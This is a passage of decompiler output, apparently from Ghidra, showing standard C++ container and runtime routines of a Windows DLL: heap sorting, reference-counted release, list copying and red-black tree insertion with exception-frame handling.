      param_1[1] = param_1[1] + 1;
      param_2 = *(int *)(param_2 + 0xc);
    }
  }
  ExceptionList = local_10;
  return param_1;
}



/* Function: FUN_10017a00 */

void __fastcall FUN_10017a00(uint param_1,int *param_2,code *param_3)

{
  int iVar1;
  int iVar2;
  char cVar3;
  uint uVar4;
  uint uVar5;
  bool bVar6;
  undefined4 *local_38;
  undefined4 local_34;
  undefined4 local_30;
  int *local_2c;
  uint local_28;
  uint local_24;
  uint local_20;
  uint local_1c;
  int *local_18;
  int *local_14;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_10074e08;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  local_28 = param_1;
  local_18 = param_2;
  local_38 = (undefined4 *)FUN_100582fa(8,DAT_100956e0 ^ (uint)&stack0xfffffffc);
  if (local_38 == (undefined4 *)0x0) {
    local_38 = (undefined4 *)0x0;
  }
  else {
    *local_38 = 0xffffffff;
    local_38[1] = 0xffffffff;
  }
  local_34 = 0;
  local_30 = 0;
  local_8 = 0;
  if (1 < param_1) {
    local_20 = (param_1 >> 1) + 1;
    local_14 = param_2 + (param_1 - 1) * 2;
    local_24 = local_20 * 2;
    local_2c = param_2 + local_20 * 2 + -2;
    do {
      if (local_20 < 2) {
        iVar1 = *local_14;
        FUN_10017cc0(iVar1);
        local_30 = *(undefined4 *)(iVar1 + 8);
        iVar1 = *param_2;
        iVar2 = *local_14;
        FUN_10017cc0(iVar1);
        local_14 = local_14 + -2;
        param_1 = param_1 - 1;
        *(undefined4 *)(iVar2 + 8) = *(undefined4 *)(iVar1 + 8);
        param_2 = local_18;
        local_28 = param_1;
        if (param_1 == 1) goto LAB_10017b84;
      }
      else {
        local_2c = local_2c + -2;
        local_20 = local_20 - 1;
        local_24 = local_24 - 2;
        iVar1 = *local_2c;
        FUN_10017cc0(iVar1);
        local_30 = *(undefined4 *)(iVar1 + 8);
      }
      local_1c = local_20;
      if (local_24 <= param_1) {
        bVar6 = local_24 < param_1;
        uVar5 = local_24;
        do {
          uVar4 = uVar5;
          if ((bVar6) &&
             (cVar3 = (*param_3)(param_2[uVar5 * 2 + -2],param_2[uVar5 * 2]), cVar3 != '\0')) {
            uVar4 = uVar5 + 1;
          }
          cVar3 = (*param_3)(&local_38,param_2[uVar4 * 2 + -2]);
          if (cVar3 == '\0') {
            uVar5 = param_1 + 1;
          }
          else {
            iVar1 = param_2[uVar4 * 2 + -2];
            iVar2 = local_18[local_1c * 2 + -2];
            FUN_10017cc0(iVar1);
            *(undefined4 *)(iVar2 + 8) = *(undefined4 *)(iVar1 + 8);
            uVar5 = uVar4 * 2;
            param_1 = local_28;
            param_2 = local_18;
            local_1c = uVar4;
          }
          bVar6 = uVar5 < param_1;
        } while (uVar5 <= param_1);
      }
      iVar1 = param_2[local_1c * 2 + -2];
      FUN_10017cc0(&local_38);
      *(undefined4 *)(iVar1 + 8) = local_30;
    } while( true );
  }
LAB_10017b9a:
  FUN_10015ce0();
  ExceptionList = local_10;
  return;
LAB_10017b84:
  iVar1 = *local_18;
  FUN_10017cc0(&local_38);
  *(undefined4 *)(iVar1 + 8) = local_30;
  goto LAB_10017b9a;
}



/* Function: FUN_10017bc0 */

void __fastcall FUN_10017bc0(undefined4 *param_1)

{
  int iVar1;
  int *piVar2;
  
  if (param_1[1] != 1) {
    FUN_10017da0();
  }
  piVar2 = (int *)*param_1;
  if (piVar2 != (int *)0x0) {
    LOCK();
    iVar1 = *piVar2;
    *piVar2 = iVar1 + -1;
    UNLOCK();
    if (iVar1 + -1 < 0) {
      FUN_100579ee(piVar2);
    }
  }
  return;
}



/* Function: FUN_10017bf0 */

undefined4 * __thiscall FUN_10017bf0(undefined4 *param_1,undefined4 param_2)

{
  undefined4 uVar1;
  
  uVar1 = FUN_10007280(param_2,param_1);
  *param_1 = uVar1;
  return param_1;
}



/* Function: FUN_10017c10 */

int * __fastcall FUN_10017c10(int *param_1)

{
  int *piVar1;
  int iVar2;
  
  iVar2 = *param_1;
  if ((iVar2 != 0) && (*(int *)(iVar2 + 8) != 0)) {
    if (iVar2 == 0) {
      iVar2 = 0;
    }
    else {
      iVar2 = iVar2 + 0xc;
    }
    FUN_10006250(&DAT_10083ff0,iVar2);
    piVar1 = (int *)*param_1;
    if (piVar1 != (int *)0x0) {
      if (*piVar1 == 0) {
        piVar1[2] = 0;
        *(undefined1 *)(piVar1 + 3) = 0;
        *param_1 = (int)piVar1;
        return param_1;
      }
      LOCK();
      iVar2 = *piVar1;
      *piVar1 = iVar2 + -1;
      UNLOCK();
      if (iVar2 + -1 < 0) {
        FUN_100579ee(piVar1);
      }
    }
    *param_1 = 0;
  }
  return param_1;
}



/* Function: FUN_10017c80 */

undefined4 * __thiscall FUN_10017c80(undefined4 *param_1,undefined4 param_2)

{
  undefined4 uVar1;
  
  uVar1 = FUN_10007b60(param_2,0xffffffff);
  *param_1 = uVar1;
  return param_1;
}



/* Function: FUN_10017ca0 */

undefined4 __fastcall FUN_10017ca0(int param_1,int param_2)

{
  undefined4 *puVar1;
  
  puVar1 = (undefined4 *)**(undefined4 **)(param_2 + 8);
  if (param_1 != 0) {
    do {
      puVar1 = (undefined4 *)*puVar1;
      param_1 = param_1 + -1;
    } while (param_1 != 0);
  }
  return puVar1[2];
}



/* Function: FUN_10017cc0 */

int * __thiscall FUN_10017cc0(int *param_1,int *param_2)

{
  int iVar1;
  int iVar2;
  undefined4 *puVar3;
  undefined4 *puVar4;
  
  if (param_1 != param_2) {
    iVar1 = *(int *)(*param_1 + 4);
    *(undefined4 *)(*param_1 + 4) = 0xffffffff;
    *(undefined4 *)*param_1 = 0xffffffff;
    while (iVar1 != -1) {
      iVar2 = *(int *)(iVar1 + 4);
      thunk_FUN_100579ee(iVar1);
      iVar1 = iVar2;
    }
    param_1[1] = 0;
    puVar3 = (undefined4 *)FUN_100582fa(8);
    if (puVar3 == (undefined4 *)0x0) {
      puVar3 = (undefined4 *)0x0;
    }
    else {
      *puVar3 = 0xffffffff;
      puVar3[1] = 0xffffffff;
    }
    *param_1 = (int)puVar3;
    param_1[1] = 0;
    for (puVar3 = *(undefined4 **)(*param_2 + 4); puVar3 != (undefined4 *)0xffffffff;
        puVar3 = (undefined4 *)puVar3[1]) {
      puVar4 = (undefined4 *)FUN_100582fa(0xc);
      if (puVar4 == (undefined4 *)0x0) {
        puVar4 = (undefined4 *)0x0;
      }
      else {
        *puVar4 = *puVar3;
        puVar4[1] = 0xffffffff;
        puVar4[2] = 0xffffffff;
      }
      iVar1 = *(int *)*param_1;
      if (iVar1 == -1) {
        *(int *)*param_1 = (int)puVar4;
        *(undefined4 **)(*param_1 + 4) = puVar4;
      }
      else {
        *(undefined4 **)(iVar1 + 4) = puVar4;
        puVar4[2] = *(undefined4 *)*param_1;
        *(undefined4 **)*param_1 = puVar4;
      }
      param_1[1] = param_1[1] + 1;
    }
    return param_1;
  }
  return param_1;
}



/* Function: FUN_10017da0 */

int __fastcall FUN_10017da0(int *param_1)

{
  int iVar1;
  int *piVar2;
  int iVar3;
  
  iVar3 = *param_1;
  if ((iVar3 != 0) && (*(int *)(iVar3 + 8) != 0)) {
    if (iVar3 == 0) {
      iVar3 = 0;
    }
    else {
      iVar3 = iVar3 + 0xc;
    }
    iVar3 = FUN_10006250(&DAT_10083ff0,iVar3);
    piVar2 = (int *)*param_1;
    if (piVar2 != (int *)0x0) {
      if (*piVar2 == 0) {
        piVar2[2] = 0;
        *(undefined1 *)(piVar2 + 3) = 0;
        *param_1 = (int)piVar2;
        return iVar3;
      }
      LOCK();
      iVar1 = *piVar2;
      iVar3 = *piVar2;
      *piVar2 = iVar1 + -1;
      UNLOCK();
      if (iVar1 + -1 < 0) {
        iVar3 = FUN_100579ee(piVar2);
      }
    }
    *param_1 = 0;
  }
  return iVar3;
}



/* Function: FUN_10017e00 */

void FUN_10017e00(undefined4 param_1,undefined4 *param_2)

{
  int iVar1;
  
  iVar1 = FUN_10018140();
  *(undefined2 *)(iVar1 + 0xc) = 0;
  if ((undefined4 *)(iVar1 + 0x10) != (undefined4 *)0x0) {
    *(undefined4 *)(iVar1 + 0x10) = *(undefined4 *)*param_2;
    *(undefined4 *)(iVar1 + 0x14) = 0;
  }
  return;
}



/* Function: FUN_10017e30 */

undefined4 * __thiscall
FUN_10017e30(undefined4 *param_1,undefined4 *param_2,int *param_3,uint *param_4,undefined4 param_5)

{
  int *piVar1;
  int iVar2;
  uint *puVar3;
  undefined4 *puVar4;
  uint *puVar5;
  bool bVar6;
  uint uStack_30;
  undefined1 auStack_20 [4];
  uint *local_1c;
  int *local_18;
  undefined1 *local_14;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_10074e30;
  local_10 = ExceptionList;
  uStack_30 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  local_14 = (undefined1 *)&uStack_30;
  ExceptionList = &local_10;
  local_8 = 0;
  if (param_1[1] == 0) {
    local_14 = (undefined1 *)&uStack_30;
    FUN_10018700(param_2,1,*param_1,param_1,param_5);
    ExceptionList = local_10;
    return param_2;
  }
  piVar1 = (int *)*param_1;
  puVar5 = param_4;
  if (param_3 == (int *)*piVar1) {
    local_14 = (undefined1 *)&uStack_30;
    if (*param_4 < (uint)param_3[4]) {
      local_14 = (undefined1 *)&uStack_30;
      FUN_10018700(param_2,1,param_3,param_4,param_5);
      ExceptionList = local_10;
      return param_2;
    }
  }
  else if (param_3 == piVar1) {
    local_14 = (undefined1 *)&uStack_30;
    if (*(uint *)(piVar1[2] + 0x10) < *param_4) {
      local_14 = (undefined1 *)&uStack_30;
      FUN_10018700(param_2,0,piVar1[2],param_4,param_5);
      ExceptionList = local_10;
      return param_2;
    }
  }
  else {
    local_1c = (uint *)*param_4;
    puVar5 = (uint *)param_3[4];
    bVar6 = puVar5 < local_1c;
    puVar3 = &uStack_30;
    if (local_1c < puVar5) {
      local_18 = param_3;
      FUN_10018180();
      if ((uint *)local_18[4] < local_1c) {
        iVar2 = local_18[2];
        if (*(char *)(iVar2 + 0xd) != '\0') {
          FUN_10018700(param_2,0,local_18,iVar2,param_5);
          ExceptionList = local_10;
          return param_2;
        }
        FUN_10018700(param_2,1,param_3,iVar2,param_5);
        ExceptionList = local_10;
        return param_2;
      }
      puVar5 = (uint *)param_3[4];
      bVar6 = puVar5 < local_1c;
      puVar3 = (uint *)local_14;
    }
    local_14 = (undefined1 *)puVar3;
    if (bVar6) {
      local_18 = param_3;
      FUN_10017870();
      if ((local_18 == piVar1) || (puVar5 = local_1c, local_1c < (uint *)local_18[4])) {
        iVar2 = param_3[2];
        if (*(char *)(iVar2 + 0xd) != '\0') {
          FUN_10018700(param_2,0,param_3,iVar2,param_5);
          ExceptionList = local_10;
          return param_2;
        }
        FUN_10018700(param_2,1,local_18,iVar2,param_5);
        ExceptionList = local_10;
        return param_2;
      }
    }
  }
  local_8 = 0xffffffff;
  puVar4 = (undefined4 *)FUN_10018210(auStack_20,puVar5,param_4,param_5);
  *param_2 = *puVar4;
  ExceptionList = local_10;
  return param_2;
}



/* Function: Catch_All@10017ff9 */

void Catch_All_10017ff9(void)

{
  undefined4 *puVar1;
  undefined4 extraout_ECX;
  int unaff_EBP;
  
  thunk_FUN_100579ee(*(undefined4 *)(unaff_EBP + 0x14));
  FUN_1005de1b(0,0);
  *(undefined4 *)(unaff_EBP + -4) = 0xffffffff;
  puVar1 = (undefined4 *)
           FUN_10018210(unaff_EBP + -0x1c,extraout_ECX,*(undefined4 *)(unaff_EBP + 0x10),
                        *(undefined4 *)(unaff_EBP + 0x14));
  **(undefined4 **)(unaff_EBP + 8) = *puVar1;
  ExceptionList = *(void **)(unaff_EBP + -0xc);
  return;
}



/* Function: FUN_10018050 */

int * __fastcall FUN_10018050(int *param_1)

{
  int iVar1;
  int *piVar2;
  uint uVar3;
  undefined4 extraout_ECX;
  undefined4 uVar4;
  undefined4 extraout_ECX_00;
  uint uVar5;
  
  if (param_1 == (int *)0x0) {
LAB_100180d5:
    uVar5 = 0;
  }
  else {
    if (*param_1 != 0) {
      iVar1 = FUN_1004b8a0(0,param_1,0,0);
      if (iVar1 == 0) {
        return param_1;
      }
      piVar2 = (int *)FUN_100074a0(param_1[2] + iVar1,1);
      uVar4 = extraout_ECX;
      if (piVar2 == (int *)0x0) {
        return param_1;
      }
      goto LAB_10018098;
    }
    if (param_1 == (int *)0x0) goto LAB_100180d5;
    uVar5 = param_1[1] - param_1[2];
  }
  uVar3 = FUN_1004b8a0(uVar5,uVar5,0,0);
  if (uVar3 < uVar5) {
    param_1[2] = param_1[2] + uVar3;
    return param_1;
  }
  if (param_1 == (int *)0x0) {
    iVar1 = 0;
  }
  else {
    iVar1 = param_1[2];
  }
  piVar2 = (int *)FUN_100073c0(iVar1 + uVar3);
  uVar4 = extraout_ECX_00;
  if (piVar2 == (int *)0x0) {
    if (param_1 != (int *)0x0) {
      *(undefined1 *)(param_1[2] + 0xc + (int)param_1) = 0;
    }
    return param_1;
  }
LAB_10018098:
  iVar1 = FUN_1004b8a0(piVar2[1] - piVar2[2],uVar4,0,0);
  piVar2[2] = piVar2[2] + iVar1;
  return piVar2;
}



/* Function: FUN_10018140 */

undefined4 * __fastcall FUN_10018140(undefined4 *param_1)

{
  code *pcVar1;
  undefined4 *puVar2;
  
  puVar2 = (undefined4 *)FUN_100582fa(0x18);
  if (puVar2 != (undefined4 *)0x0) {
    *puVar2 = *param_1;
    if (puVar2 + 1 != (undefined4 *)0x0) {
      puVar2[1] = *param_1;
    }
    if (puVar2 + 2 != (undefined4 *)0x0) {
      puVar2[2] = *param_1;
    }
    return puVar2;
  }
  FUN_10056a39();
  pcVar1 = (code *)swi(3);
  puVar2 = (undefined4 *)(*pcVar1)();
  return puVar2;
}



/* Function: FUN_10018180 */

int * __fastcall FUN_10018180(int *param_1)

{
  char cVar1;
  undefined4 *puVar2;
  int iVar3;
  int iVar4;
  int *piVar5;
  
  puVar2 = (undefined4 *)*param_1;
  if (*(char *)((int)puVar2 + 0xd) != '\0') {
    *param_1 = puVar2[2];
    return param_1;
  }
  piVar5 = (int *)*puVar2;
  if (*(char *)((int)piVar5 + 0xd) == '\0') {
    iVar3 = piVar5[2];
    if (*(char *)(piVar5[2] + 0xd) == '\0') {
      do {
        iVar4 = iVar3;
        iVar3 = *(int *)(iVar4 + 8);
      } while (*(char *)(iVar3 + 0xd) == '\0');
      *param_1 = iVar4;
      return param_1;
    }
  }
  else {
    piVar5 = (int *)puVar2[1];
    cVar1 = *(char *)((int)piVar5 + 0xd);
    while ((cVar1 == '\0' && (*param_1 == *piVar5))) {
      *param_1 = (int)piVar5;
      piVar5 = (int *)piVar5[1];
      cVar1 = *(char *)((int)piVar5 + 0xd);
    }
    if (*(char *)(*param_1 + 0xd) != '\0') {
      return param_1;
    }
  }
  *param_1 = (int)piVar5;
  return param_1;
}



/* Function: FUN_100181e0 */

int FUN_100181e0(undefined4 *param_1)

{
  int iVar1;
  
  iVar1 = FUN_10018140();
  *(undefined2 *)(iVar1 + 0xc) = 0;
  if ((undefined4 *)(iVar1 + 0x10) != (undefined4 *)0x0) {
    *(undefined4 *)(iVar1 + 0x10) = *param_1;
    *(undefined4 *)(iVar1 + 0x14) = param_1[1];
  }
  return iVar1;
}



/* Function: FUN_10018210 */

void __thiscall
FUN_10018210(uint *param_1,undefined4 *param_2,undefined4 param_3,uint *param_4,undefined4 param_5)

{
  int *piVar1;
  int *piVar2;
  undefined4 *puVar3;
  int *piVar4;
  bool bVar5;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_10074e50;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  local_8 = 0;
  piVar1 = (int *)*param_1;
  bVar5 = true;
  piVar4 = piVar1;
  if (*(char *)(piVar1[1] + 0xd) == '\0') {
    piVar2 = (int *)piVar1[1];
    do {
      piVar4 = piVar2;
      bVar5 = *param_4 < (uint)piVar4[4];
      if (bVar5) {
        piVar2 = (int *)*piVar4;
      }
      else {
        piVar2 = (int *)piVar4[2];
      }
    } while (*(char *)((int)piVar2 + 0xd) == '\0');
  }
  if (bVar5) {
    if (piVar4 == (int *)*piVar1) {
      bVar5 = true;
      goto LAB_10018293;
    }
    FUN_10018180();
  }
  param_1 = param_4;
  if (*param_4 <= (uint)piVar4[4]) {
    thunk_FUN_100579ee(param_5);
    *param_2 = piVar4;
    *(undefined1 *)(param_2 + 1) = 0;
    ExceptionList = local_10;
    return;
  }
LAB_10018293:
  puVar3 = (undefined4 *)FUN_10018700(&param_4,bVar5,piVar4,param_1,param_5);
  *param_2 = *puVar3;
  *(undefined1 *)(param_2 + 1) = 1;
  ExceptionList = local_10;
  return;
}



/* Function: Catch_All@100182dd */

void Catch_All_100182dd(void)

{
  undefined4 *puVar1;
  int unaff_EBP;
  undefined4 unaff_ESI;
  
  thunk_FUN_100579ee(*(undefined4 *)(unaff_EBP + 0x14));
  FUN_1005de1b(0,0);
  thunk_FUN_100579ee();
  puVar1 = *(undefined4 **)(unaff_EBP + 8);
  *puVar1 = unaff_ESI;
  *(undefined1 *)(puVar1 + 1) = 0;
  ExceptionList = *(void **)(unaff_EBP + -0xc);
  return;
}



/* Function: FUN_10018320 */

void __fastcall
FUN_10018320(int param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4,uint param_5)

{
  undefined4 *puVar1;
  uint *puVar2;
  int iVar3;
  int *piVar4;
  int *piVar5;
  int iVar6;
  undefined4 extraout_ECX;
  int *extraout_ECX_00;
  int *piVar7;
  int local_44 [3];
  int *local_38;
  int *local_34;
  undefined4 local_30;
  undefined4 local_2c;
  undefined4 *local_28;
  int *local_24;
  undefined4 *local_20;
  int *local_1c;
  int *local_18;
  int local_14;
  void *local_10;
  undefined1 *puStack_c;
  undefined1 local_8;
  undefined3 uStack_7;
  
  puStack_c = &LAB_10074e88;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  local_38 = (int *)0x0;
  local_34 = (undefined4 *)0x0;
  local_30 = 0;
  local_2c = 0;
  local_28 = (undefined4 *)0x0;
  local_24 = (int *)0x0;
  local_8 = 1;
  uStack_7 = 0;
  local_44[0] = 0;
  local_44[1] = 0;
  local_44[2] = 0;
  FUN_10018c20(*(undefined4 *)(param_1 + 0x18),&local_2c);
  _local_8 = CONCAT31(uStack_7,3);
  FUN_10018bb0(extraout_ECX);
  if (local_34 != (undefined4 *)0x0) {
    *local_34 = param_2;
  }
  local_34 = local_34 + 1;
LAB_100183c2:
  iVar6 = FUN_10018de0(local_44);
  piVar5 = local_34;
  piVar4 = local_38;
  if (iVar6 != 0) goto code_r0x100183db;
  goto LAB_100183e6;
code_r0x100183db:
  if (param_5 <= (uint)((int)local_34 - (int)local_38 >> 2)) {
LAB_100183e6:
    local_18 = local_34 + -1;
    piVar7 = (int *)*local_18;
    local_28 = (undefined4 *)*piVar7;
    for (local_20 = (undefined4 *)*local_28; local_24 = piVar7, local_1c = piVar7,
        local_20 != local_28; local_20 = (undefined4 *)*local_20) {
      if (local_20[2] == *local_38) {
        if ((int)local_34 - (int)local_38 >> 2 != 0) {
          FUN_10018f20(&local_38,piVar7);
          piVar7 = extraout_ECX_00;
        }
        break;
      }
    }
    iVar6 = local_44[0];
    if ((uint)((int)piVar5 - (int)piVar4 >> 2) < 2) {
      if (local_44[0] != 0) {
        FUN_100190a0(piVar7,local_18);
        thunk_FUN_100579ee(iVar6);
      }
      thunk_FUN_100579ee(piVar4);
      ExceptionList = local_10;
      return;
    }
    local_34 = local_18;
    iVar6 = *local_18;
    iVar3 = local_18[-1];
    puVar1 = (undefined4 *)(local_44[0] + *(int *)(iVar6 + 0x10) * 0xc);
    puVar1[1] = *puVar1;
    piVar4 = *(int **)(local_44[0] + 4 + *(int *)(iVar3 + 0x10) * 0xc);
    puVar2 = (uint *)(local_44[0] + *(int *)(iVar3 + 0x10) * 0xc);
    local_14 = iVar6;
    if (&local_14 < piVar4) {
      piVar5 = (int *)*puVar2;
      if (piVar5 <= &local_14) {
        if (piVar4 == (int *)puVar2[2]) {
          FUN_10018bb0(piVar4);
        }
        if ((undefined4 *)puVar2[1] != (undefined4 *)0x0) {
          *(undefined4 *)puVar2[1] =
               *(undefined4 *)(*puVar2 + ((int)&local_14 - (int)piVar5 >> 2) * 4);
        }
        puVar2[1] = puVar2[1] + 4;
        goto LAB_100183c2;
      }
    }
    if (piVar4 == (int *)puVar2[2]) {
      FUN_10018bb0(piVar4);
    }
    if ((int *)puVar2[1] != (int *)0x0) {
      *(int *)puVar2[1] = iVar6;
    }
    puVar2[1] = puVar2[1] + 4;
  }
  goto LAB_100183c2;
}



/* Function: FUN_10018510 */

void __fastcall
FUN_10018510(int param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4,uint param_5)

{
  undefined4 *puVar1;
  uint *puVar2;
  int iVar3;
  int *piVar4;
  int *piVar5;
  int iVar6;
  undefined4 extraout_ECX;
  int *extraout_ECX_00;
  int *piVar7;
  int local_44 [3];
  int *local_38;
  int *local_34;
  undefined4 local_30;
  undefined4 local_2c;
  undefined4 *local_28;
  int *local_24;
  undefined4 *local_20;
  int *local_1c;
  int *local_18;
  int local_14;
  void *local_10;
  undefined1 *puStack_c;
  undefined1 local_8;
  undefined3 uStack_7;
  
  puStack_c = &LAB_10074e88;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  local_38 = (int *)0x0;
  local_34 = (undefined4 *)0x0;
  local_30 = 0;
  local_2c = 0;
  local_28 = (undefined4 *)0x0;
  local_24 = (int *)0x0;
  local_8 = 1;
  uStack_7 = 0;
  local_44[0] = 0;
  local_44[1] = 0;
  local_44[2] = 0;
  FUN_10018c20(*(undefined4 *)(param_1 + 0x18),&local_2c);
  _local_8 = CONCAT31(uStack_7,3);
  FUN_10018bb0(extraout_ECX);
  if (local_34 != (undefined4 *)0x0) {
    *local_34 = param_2;
  }
  local_34 = local_34 + 1;
LAB_100185b2:
  iVar6 = FUN_10018de0(local_44);
  piVar5 = local_34;
  piVar4 = local_38;
  if (iVar6 != 0) goto code_r0x100185cb;
  goto LAB_100185d6;
code_r0x100185cb:
  if (param_5 <= (uint)((int)local_34 - (int)local_38 >> 2)) {
LAB_100185d6:
    local_18 = local_34 + -1;
    piVar7 = (int *)*local_18;
    local_28 = (undefined4 *)*piVar7;
    for (local_20 = (undefined4 *)*local_28; local_24 = piVar7, local_1c = piVar7,
        local_20 != local_28; local_20 = (undefined4 *)*local_20) {
      if (local_20[2] == *local_38) {
        if ((int)local_34 - (int)local_38 >> 2 != 0) {
          FUN_10018ff0(&local_38,piVar7);
          piVar7 = extraout_ECX_00;
        }
        break;
      }
    }
    iVar6 = local_44[0];
    if ((uint)((int)piVar5 - (int)piVar4 >> 2) < 2) {
      if (local_44[0] != 0) {
        FUN_100190a0(piVar7,local_18);
        thunk_FUN_100579ee(iVar6);
      }
      thunk_FUN_100579ee(piVar4);
      ExceptionList = local_10;
      return;
    }
    local_34 = local_18;
    iVar6 = *local_18;
    iVar3 = local_18[-1];
    puVar1 = (undefined4 *)(local_44[0] + *(int *)(iVar6 + 0x10) * 0xc);
    puVar1[1] = *puVar1;
    piVar4 = *(int **)(local_44[0] + 4 + *(int *)(iVar3 + 0x10) * 0xc);
    puVar2 = (uint *)(local_44[0] + *(int *)(iVar3 + 0x10) * 0xc);
    local_14 = iVar6;
    if (&local_14 < piVar4) {
      piVar5 = (int *)*puVar2;
      if (piVar5 <= &local_14) {
        if (piVar4 == (int *)puVar2[2]) {
          FUN_10018bb0(piVar4);
        }
        if ((undefined4 *)puVar2[1] != (undefined4 *)0x0) {
          *(undefined4 *)puVar2[1] =
               *(undefined4 *)(*puVar2 + ((int)&local_14 - (int)piVar5 >> 2) * 4);
        }
        puVar2[1] = puVar2[1] + 4;
        goto LAB_100185b2;
      }
    }
    if (piVar4 == (int *)puVar2[2]) {
      FUN_10018bb0(piVar4);
    }
    if ((int *)puVar2[1] != (int *)0x0) {
      *(int *)puVar2[1] = iVar6;
    }
    puVar2[1] = puVar2[1] + 4;
  }
  goto LAB_100185b2;
}



/* Function: FUN_10018700 */

void __thiscall
FUN_10018700(int *param_1,undefined4 *param_2,char param_3,undefined4 *param_4,undefined4 param_5,
            int *param_6)

{
  char cVar1;
  int *piVar2;
  int iVar3;
  code *pcVar4;
  int *piVar5;
  int *piVar6;
  int *piVar7;
  
  if (0xaaaaaa8 < (uint)param_1[1]) {
    thunk_FUN_100579ee(param_6);
    FUN_10056a6a("map/set<T> too long");
    pcVar4 = (code *)swi(3);
    (*pcVar4)();
    return;
  }
  param_1[1] = param_1[1] + 1;
  param_6[1] = (int)param_4;
  if (param_4 == (undefined4 *)*param_1) {
    ((undefined4 *)*param_1)[1] = param_6;
    *(int **)*param_1 = param_6;
    *(int **)(*param_1 + 8) = param_6;
  }
  else if (param_3 == '\0') {
    param_4[2] = param_6;
    if (param_4 == *(undefined4 **)(*param_1 + 8)) {
      *(int **)(*param_1 + 8) = param_6;
    }
  }
  else {
    *param_4 = param_6;
    if (param_4 == *(undefined4 **)*param_1) {
      *(int **)*param_1 = param_6;
    }
  }
  cVar1 = *(char *)(param_6[1] + 0xc);
  piVar5 = param_6;
  do {
    if (cVar1 != '\0') {
      *(undefined1 *)(*(int *)(*param_1 + 4) + 0xc) = 1;
      *param_2 = param_6;
      return;
    }
    piVar7 = (int *)piVar5[1];
    piVar6 = *(int **)piVar7[1];
    if (piVar7 == piVar6) {
      piVar6 = (int *)((undefined4 *)piVar7[1])[2];
      if ((char)piVar6[3] != '\0') {
        if (piVar5 == (int *)piVar7[2]) {
          piVar5 = (int *)piVar7[2];
          piVar7[2] = *piVar5;
          if (*(char *)(*piVar5 + 0xd) == '\0') {
            *(int **)(*piVar5 + 4) = piVar7;
          }
          piVar5[1] = piVar7[1];
          if (piVar7 == *(int **)(*param_1 + 4)) {
            *(int **)(*param_1 + 4) = piVar5;
          }
          else {
            piVar6 = (int *)piVar7[1];
            if (piVar7 == (int *)*piVar6) {
              *piVar6 = (int)piVar5;
            }
            else {
              piVar6[2] = (int)piVar5;
            }
          }
          *piVar5 = (int)piVar7;
          piVar7[1] = (int)piVar5;
          piVar5 = piVar7;
        }
        *(undefined1 *)(piVar5[1] + 0xc) = 1;
        *(undefined1 *)(*(int *)(piVar5[1] + 4) + 0xc) = 0;
        piVar7 = *(int **)(piVar5[1] + 4);
        piVar6 = (int *)*piVar7;
        *piVar7 = piVar6[2];
        if (*(char *)(piVar6[2] + 0xd) == '\0') {
          *(int **)(piVar6[2] + 4) = piVar7;
        }
        piVar6[1] = piVar7[1];
        if (piVar7 == *(int **)(*param_1 + 4)) {
          *(int **)(*param_1 + 4) = piVar6;
          piVar6[2] = (int)piVar7;
        }
        else {
          piVar2 = (int *)piVar7[1];
          if (piVar7 == (int *)piVar2[2]) {
            piVar2[2] = (int)piVar6;
            piVar6[2] = (int)piVar7;
          }
          else {
            *piVar2 = (int)piVar6;
            piVar6[2] = (int)piVar7;
          }
        }
        goto LAB_100188cf;
      }
LAB_10018826:
      *(undefined1 *)(piVar7 + 3) = 1;
      *(undefined1 *)(piVar6 + 3) = 1;
      *(undefined1 *)(*(int *)(piVar5[1] + 4) + 0xc) = 0;
      piVar5 = *(int **)(piVar5[1] + 4);
    }
    else {
      if ((char)piVar6[3] == '\0') goto LAB_10018826;
      if (piVar5 == (int *)*piVar7) {
        iVar3 = *piVar7;
        *piVar7 = *(int *)(iVar3 + 8);
        if (*(char *)(*(int *)(iVar3 + 8) + 0xd) == '\0') {
          *(int **)(*(int *)(iVar3 + 8) + 4) = piVar7;
        }
        *(int *)(iVar3 + 4) = piVar7[1];
        if (piVar7 == *(int **)(*param_1 + 4)) {
          *(int *)(*param_1 + 4) = iVar3;
        }
        else {
          piVar5 = (int *)piVar7[1];
          if (piVar7 == (int *)piVar5[2]) {
            piVar5[2] = iVar3;
          }
          else {
            *piVar5 = iVar3;
          }
        }
        *(int **)(iVar3 + 8) = piVar7;
        piVar7[1] = iVar3;
        piVar5 = piVar7;
      }
      *(undefined1 *)(piVar5[1] + 0xc) = 1;
      *(undefined1 *)(*(int *)(piVar5[1] + 4) + 0xc) = 0;
      piVar7 = *(int **)(piVar5[1] + 4);
      piVar6 = (int *)piVar7[2];
      piVar7[2] = *piVar6;
      if (*(char *)(*piVar6 + 0xd) == '\0') {
        *(int **)(*piVar6 + 4) = piVar7;
      }
      piVar6[1] = piVar7[1];
      if (piVar7 == *(int **)(*param_1 + 4)) {
        *(int **)(*param_1 + 4) = piVar6;
      }
      else {
        piVar2 = (int *)piVar7[1];
        if (piVar7 == (int *)*piVar2) {
          *piVar2 = (int)piVar6;
        }
        else {
          piVar2[2] = (int)piVar6;
        }
      }
      *piVar6 = (int)piVar7;
LAB_100188cf:
      piVar7[1] = (int)piVar6;
    }
    cVar1 = *(char *)(piVar5[1] + 0xc);
  } while( true );
}



/* Function: FUN_10018910 */

void __fastcall
FUN_10018910(undefined4 param_1,int *param_2,int *param_3,undefined4 *param_4,int *param_5)

{
  int iVar1;
  code *pcVar2;
  int iVar3;
  int iVar4;
  int *local_1c;
  int *local_18;
  int *piStack_14;
  int local_10;
  undefined8 *local_c;
  
  piStack_14 = (int *)*param_4;
  local_10 = param_4[1];
  iVar1 = *param_5;
  local_18 = param_3;
  local_1c = param_2;
  iVar3 = FUN_100191d0(iVar1,*(undefined4 *)(iVar1 + 4),&local_1c);
  if (param_5[1] == 0xaaaaaa9) {
    FUN_10056a6a("list<T> too long");
  }
  else {
    piStack_14 = param_3;
    param_5[1] = param_5[1] + 1;
    *(int *)(iVar1 + 4) = iVar3;
    **(int **)(iVar3 + 4) = iVar3;
    iVar1 = *param_2;
